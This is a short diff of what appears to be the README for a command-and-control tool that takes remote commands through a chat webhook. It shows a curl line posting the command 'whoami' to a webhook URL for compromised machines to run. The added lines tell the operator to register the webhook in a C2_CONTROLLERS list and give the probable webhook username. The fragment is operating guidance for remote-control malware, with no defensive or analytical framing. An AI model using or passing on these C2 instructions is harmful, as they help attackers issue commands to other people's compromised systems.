@@ -53,6 +53,9 @@ Now, you can use this command to send the commands with the webhook:
 curl WEBHOOK_URL -H "Content-Type: application/json" --data "{\"content\": \"whoami\"}"
 ```
 
+Dont forget to add the webhook in the C2_CONTROLLERS list !!!
+
+The Webhook username probably will be WebHookName#0000
 
 
 
